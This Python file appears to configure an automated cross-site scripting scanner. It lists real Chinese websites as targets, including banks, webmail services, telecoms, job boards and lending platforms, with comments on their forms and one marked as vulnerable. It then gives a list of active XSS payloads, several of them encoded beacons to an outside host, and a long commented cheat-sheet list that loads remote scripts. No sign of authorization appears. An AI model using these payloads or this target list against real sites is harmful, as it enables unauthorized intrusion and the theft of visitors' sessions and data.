# _*_coding:utf-8_*_

sites = [
    'http://www.dajie.com/home?f=inbound',
    'http://www.2925.com/write.aspx',
    # "http://magicmining.sinaapp.com/chat",
    # "http://www.baidu.com",
    # 没有提交按钮 是超链接 可以通过构造参数提交 "http://tieba.baidu.com/",
    # "http://127.0.0.1/dvwa/vulnerabilities/xss_r/",
    # 没有表单 直接从input提交
    "http://www.kaola.com/",
    "http://www.u17.com",
    # 复杂页面 多个搜索类别共用一个表单 通过hidden参数改变类别 同时搜索值也是一个hidden参数 由脚本更改后提交 "http://www.sina.com.cn/",
    # 没有表单 但可以提交意见 "http://cbg.baidu.com/?sc=1000020",
    # 复杂页面 "http://map.baidu.com",
    # 无法打开 "http://weibo.com/",
    # 有post表单 "http://www.sohu.com/",
    # 无法打开 "http://www.qq.com/",
    # 表单与按钮配合 "http://www.iqiyi.com/",
    # 复杂页面 报错 "http://www.ifeng.com",
    # "http://www.autohome.com.cn",
    #　"http://www.eastmoney.com",
    # 没有找到表单 "http://www.fang.com/",
    # "http://www.qunar.com/",
    # 有post表单 "http://www.lianjia.com/",
    # 没有表单 "http://www.meipai.com",
    # 参数太多无法模拟提交 "http://www.zhaopin.com",
    # radio "http://www.ccb.com/",
    # 超时 "http://www.17173.com/",
    # 超时 "http://military.china.com/zh_cn/",
    # 超时 "http://www.xinjunshi.com/",
    # "http://www.hupu.com/",
    # "http://www.zhenai.com/", 存在漏洞
    # "http://www.fang.com",
    # "http://www.78.cn/?sid=1102",
    "http://www.10086.cn/",
    "http://www.ganji.com/",
    "http://www.pcauto.com.cn/",
    "http://www.bitauto.com/",
    "http://www.xcar.com.cn/",
    "http://www.gdxxb.com/85763",
    "http://www.gdxxb.com/85762",
    "http://cdn.919377.com/welcome.html?id=6829",
    "http://zt.ztgame.com/url/hao.html",
    "http://www.10010.com/",
    "http://www.189.cn/",
    "http://www.zol.com.cn/",
    "http://mobile.pconline.com.cn/",
    "http://www.18183.com/",
    "http://www.feng.com/",
    "http://zs.91.com/co/bd/",
    "http://www.tuniu.com/",
    "http://www.LY.com",
    "http://www.elong.com/",
    "http://www.stockstar.com/",
    "http://www.10jqka.com.cn/",
    "http://www.hexun.com/",
    "http://www.itouzi.com",
    "http://www.jimubox.com",
    "http://www.renrendai.com",
    "http://www.eastmoney.com/",
    "http://www.yooli.com",
    "http://www.souyidai.com",
    "http://www.haodai.com",
    "http://www.yztz.com",
    "http://www.rayli.com.cn/",
    "http://www.mogujie.com",
    "http://www.zhcw.com/",
    "http://www.icbc.com.cn/",
    "http://www.ccb.com/",
    "http://www.abchina.com/",
    "http://www.boc.cn/",
    "http://www.bankcomm.com/",
    "http://www.cmbchina.com/",
    "http://www.zhaopin.com/",
    "http://www.51job.com/",
    "http://www.ganji.com/zhaopin/",
    "http://www.liepin.com/abtest/38/",
    "http://www.yingjiesheng.com/",
    "http://www.58.com/?path=job.shtml",
    "http://www.youqudian.com/c_5/3711.html",
    "http://www.baihe.com/",
    "http://www.69xiu.com/extension/speadRoom?jxiusr=baidu_web_m5",
    "http://www.zhibo8.cc/",
    "http://mail.163.com/",
    "http://mail.126.com/",
    "http://mail.aliyun.com/",
    "http://mail.sina.com.cn/",
    "http://mail.qq.com/",
    "http://www.qidian.com/",
    "http://www.xxsy.net/",
    "http://www.1ting.com/",
    "http://www.kugou.com/",
    "http://www.kuwo.cn/",
    "http://www.tianya.cn/",
]

'''
def fun(string):
    r = ''
    for s in string:
        r += '&#x%x' % ord(s)
    return r
'''

# <SCRIPT>alert('XSS');</SCRIPT>
# <IMG SRC=http://wedge.sinaapp.com/3>

'''
<SCRIPT>alert('XSS');</SCRIPT>
由于IE7后不支持<IMG SRC="javascript:alert('XSS');">中脚本的执行，因此这种攻击方式不再有效，但SRC中的链接仍然会被执行。
<IMG SRC=http://wedge.sinaapp.com/3>
十进制html编码引用 http://wedge.sinaapp.com/4
<IMG SRC=&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#101;&#100;&#103;&#101;&#46;&#115;&#105;&#110;&#97;&#97;&#112;&#112;&#46;&#99;&#111;&#109;&#47;&#52;>
结尾没有分号的十进制html编码引用 http://wedge.sinaapp.com/5
<IMG SRC=&#0000104&#0000116&#0000116&#0000112&#000058&#000047&#000047&#0000119&#0000101&#0000100&#0000103&#0000101&#000046&#0000115&#0000105&#0000110&#000097&#000097&#0000112&#0000112&#000046&#000099&#0000111&#0000109&#000047&#000053>
结尾没有分号的十六进制html编码引用 http://wedge.sinaapp.com/6
<IMG SRC=&#x68&#x74&#x74&#x70&#x3a&#x2f&#x2f&#x77&#x65&#x64&#x67&#x65&#x2e&#x73&#x69&#x6e&#x61&#x61&#x70&#x70&#x2e&#x63&#x6f&#x6d&#x2f&#x36>
BODY标签实现XSS攻击
<BODY ONLOAD=alert('XSS')>
meta refresh实现XSS攻击
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
URL指令方案，使用了base64编码实现XSS攻击
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
IFRAME标签实现XSS攻击
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
'''

xss_vectors = [
    '''<SCRIPT>alert('XSS');</SCRIPT>''',
    # ''''';!--"<XSS>=&{()}''',
    '''<IMG SRC=http://wedge.sinaapp.com/3>''',  # IE7后不支持 <IMG SRC="javascript:alert('XSS');">
    # http://wedge.sinaapp.com/4
    '''<IMG SRC=&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#101;&#100;&#103;&#101;&#46;&#115;&#105;&#110;&#97;&#97;&#112;&#112;&#46;&#99;&#111;&#109;&#47;&#52;>''',
    # http://wedge.sinaapp.com/5
    '''<IMG SRC=&#0000104&#0000116&#0000116&#0000112&#000058&#000047&#000047&#0000119&#0000101&#0000100&#0000103&#0000101&#000046&#0000115&#0000105&#0000110&#000097&#000097&#0000112&#0000112&#000046&#000099&#0000111&#0000109&#000047&#000053>''',
    # http://wedge.sinaapp.com/6
    '''<IMG SRC=&#x68&#x74&#x74&#x70&#x3a&#x2f&#x2f&#x77&#x65&#x64&#x67&#x65&#x2e&#x73&#x69&#x6e&#x61&#x61&#x70&#x70&#x2e&#x63&#x6f&#x6d&#x2f&#x36>''',
    # '''<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>''',
    # '''<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>''',
    # '''<SCRIPT>a=/XSS/''',
    # '''\";alert('XSS');//''',
    # '''<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">''',
    # '''<BODY BACKGROUND="javascript:alert('XSS')">''',
    '''<BODY ONLOAD=alert('XSS')>''',
    # '''<IMG DYNSRC="javascript:alert('XSS')">''',
    # '''<IMG LOWSRC="javascript:alert('XSS')">''',
    # '''<BGSOUND SRC="javascript:alert('XSS');">''',
    # '''<BR SIZE="&{alert('XSS')}">''',
    # '''<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>''',
    # '''<LINK REL="stylesheet" HREF="javascript:alert('XSS');">''',
    # '''<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">''',
    # '''<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>''',
    # '''<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">''',
    # '''<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>''',
    # 需要添加代码'''<IMG SRC='vbscript:msgbox("XSS")'>''',
    # 需要添加代码'''<IMG SRC="mocha:[code]">''',
    # 需要添加代码'''<IMG SRC="livescript:[code]">''',
    '''<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">''',
    '''<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">''',
    # '''<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">''',
    # '''<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">''',
    '''<IFRAME SRC="javascript:alert('XSS');"></IFRAME>''',
    # '''<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>''',
    # '''<TABLE BACKGROUND="javascript:alert('XSS')">''',
    # '''<DIV STYLE="background-image: url(javascript:alert('XSS'))">''',
    # '''<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">''',
    # '''<DIV STYLE="width: expression(alert('XSS'));">''',
    # '''<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>''',
    # '''<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">''',
    # '''<XSS STYLE="xss:expression(alert('XSS'))">''',
    # \xss '''exp/*<XSS STYLE='no\xss:noxss("*//*");''',
    # '''<STYLE TYPE="text/javascript">alert('XSS');</STYLE>''',
    # '''<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>''',
    # '''<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>''',
    # '''<BASE HREF="javascript:alert('XSS');//">''',
    # '''<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>''',
    # '''<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>''',
    # '''getURL("javascript:alert('XSS')")''',
    # '''a="get";''',
    # '''<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">''',
    # '''<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>''',
    # '''<HTML><BODY>''',
    # '''<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>''',
    # '''<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->''',
    # '''<? echo('<SCR)';''',
    # '''<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">''',
    # '''<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-''',
    # '''<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>''',
    # '''<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>''',
    # '''<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>''',
    # '''<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>''',
    # '''<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>'''
]
